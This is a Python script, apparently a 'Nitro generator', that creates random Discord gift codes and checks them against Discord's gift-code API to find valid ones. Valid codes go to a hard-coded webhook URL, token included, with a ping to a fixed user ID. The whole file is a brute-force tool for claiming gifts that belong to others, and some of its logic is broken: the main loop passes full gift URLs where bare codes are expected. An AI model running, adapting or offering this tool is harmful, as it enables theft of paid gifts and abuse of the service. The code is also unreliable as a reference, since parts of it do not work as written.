from discord_webhook import DiscordWebhook
import requests
import random
import string
import time
import os


class NitroGen:
    def __init__(self):
        self.fileName = "Nitro Codes.txt"

    def main(self):
        webhook = "https://discord.com/api/webhooks/808621487304605696/UHIjITdyTzRtuBLH9JgVMJQdUsCb3uR2zEmOPudD7HF-kn3LhBQqmAzWpQXEkUjfNwNY"
        num = 9999
        valid = []
        invalid = 0
        for i in range(num):
            code = "".join(random.choices(  
                string.ascii_uppercase + string.digits + string.ascii_lowercase,
                k=16
            ))

            i -= 1

            url = f"https://discord.gift/{code}"

            result = self.quickChecker(url, webhook)

            if result:
                valid.append(url)
            else:
                invalid += 1

            if result and webhook is None:
                break
    # Function used to print text a little more fancier
    def slowType(self, text, speed, newLine=True):
        for i in text:  # Loop over the message
            # Print the one charecter, flush is used to force python to print the char
            print(i, end="", flush=True)
            time.sleep(speed)  # Sleep a little before the next one
        if newLine:  # Check if the newLine argument is set to True
            print()  # Print a final newline to make it act more like a normal print statement

    def generator(self, amount):  # Function used to generate and store nitro codes in a seperate file
        with open(self.fileName, "w", encoding="utf-8") as file:  # Load up the file in write mode
            # Let the user know the code is generating the codes
            print("Wait, Generating for you")

            start = time.time()  # Note the initaliseation time

            for i in range(amount):  # Loop the amount of codes to generate
                code = "".join(random.choices(
                    string.ascii_uppercase + string.digits + string.ascii_lowercase,
                    k=16
                ))  # Generate the code id

                file.write(f"https://discord.gift/{code}\n")  # Write the code

            # Tell the user its done generating and how long tome it took
            print(
                f"Genned {amount} codes | Time taken: {round(time.time() - start, 5)}s\n")

    def fileChecker(self, notify=None):  # Function used to check nitro codes from a file
        valid = []  # A list of the valid codes
        invalid = 0  # The amount of invalid codes detected
        # Open the file containing the nitro codes
        with open(self.fileName, "r", encoding="utf-8") as file:
            for line in file.readlines():  # Loop over each line in the file
                # Remove the newline at the end of the nitro code
                nitro = line.strip("\n")

                # Create the requests url for later use
                url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"

                response = requests.get(url)  # Get the responce from the url

                if response.status_code == 200:
                    valid.append(nitro)

                    if notify is not None:
                        DiscordWebhook(
                            url=notify,
                            content=f"Valid Nito Code detected! <@!591970092720324610> \n{nitro}"
                        ).execute()

                    else:  # If there has not been a discord webhook setup just stop the code
                        break  # Stop the loop since a valid code was found

                # If the responce got ignored or is invalid ( such as a 404 or 405 )
                else:
                    # Tell the user it tested a code and it was invalid
                    print(f" Invalid | {nitro} ")
                    invalid += 1  # Increase the invalid counter by one

        # Return a report of the results
        return {"valid": valid, "invalid": invalid}

    def quickChecker(self, nitro, notify=None):  # Used to check a single code at a time
        # Generate the request url
        url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
        response = requests.get(url)  # Get the response from discord

        if response.status_code == 200:  # If the responce went through
            print(f" Valid | {nitro} ")  # Notify the user the code was valid

            if notify is not None:  # If a webhook has been added
                DiscordWebhook(  # Send the message to discord letting the user know there has been a valid nitro code
                    url=notify,
                    content=f"Valid Nito Code detected! <@!591970092720324610> \n{nitro}"
                ).execute()

            return True  # Tell the main function the code was found

        # If the responce got ignored or is invalid ( such as a 404 or 405 )
        else:
            # Tell the user it tested a code and it was invalid
            print(f" Invalid | {nitro} ")
            return False  # Tell the main function there was not a code found
